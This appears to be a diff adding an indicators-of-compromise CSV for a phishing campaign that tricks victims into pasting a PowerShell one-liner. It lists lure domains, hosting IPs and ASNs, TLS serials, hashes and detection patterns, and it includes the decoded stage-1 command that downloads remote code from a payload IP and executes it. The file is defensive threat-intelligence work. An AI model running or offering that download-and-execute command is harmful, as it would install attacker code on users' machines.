@@ -1,0 +1,20 @@
+indicator_type,value,context,confidence
+url,https://dateseni[.]su/rave/next.php,Initial lure / redirector URL supplied by victim,high
+domain,dateseni[.]su,Lure + mail-phishing domain (REG.RU NS, .su TLD),high
+ip,196.251.107[.]41,A-record for dateseni.su - Frankfurt DE - AS214351 FEMO IT SOLUTIONS LIMITED,high
+ip,166.1.89[.]91,Stage-2 payload host - New York US - AS395839 HOSTKEY / InterLIR LLC,high
+url,http://166.1.89[.]91/zap/,Stage-2 endpoint called inside the Base64 blob (plain HTTP),high
+asn,AS395839,HOSTKEY - payload hosting ASN,medium
+asn,AS214351,FEMO IT SOLUTIONS LIMITED - lure hosting ASN,medium
+hostname,mail.dateseni[.]su,Mail hostname present in TLS SAN - indicates mass-mail / Exchange impersonation,medium
+hostname,owa.dateseni[.]su,Fake Outlook Web Access hostname in TLS SAN,medium
+hostname,autodiscover.dateseni[.]su,Outlook autoconfig hostname in TLS SAN,medium
+hostname,www.dateseni[.]su,Web hostname in TLS SAN,high
+tls_serial,05fd43a507156b30c41e74149c948a0f8416,Let's Encrypt cert for dateseni.su (2026-06-18 to 2026-09-16),high
+tls_serial,11e6bb08a96e18ae71df52c2,GlobalSign DV cert incl. mail/owa/autodiscover (2026-03-21 to 2026-10-06),high
+file_hash_sha256,6ccfc636a365453ccbc0e741d5c4a93dcc619c7cbd153f98072dd4b0163aabe8,SHA256 of the Base64 blob (string hash - not a file hash),low
+file_hash_sha256,c64af60adc8ee3ab91fc9f1960da8b6a9822ad7a5629baacb0710aa9547db311,SHA256 of the full one-liner as pasted,low
+command,"Invoke-WebRequest 'http://166.1.89.91/zap/' -UseBasicParsing | Invoke-Expression",Decoded stage-1 command,high
+pattern,IWR + IEX in a single PowerShell command line,Behavioural detection signature,high
+pattern,powershell.exe spawned by explorer.exe with no visible arguments,Win+X -> I -> Ctrl+V chain artefact,medium
+redirect,https://highporn[.]net/video/30978/...,Redirect target of next.php in the archived snapshot,medium
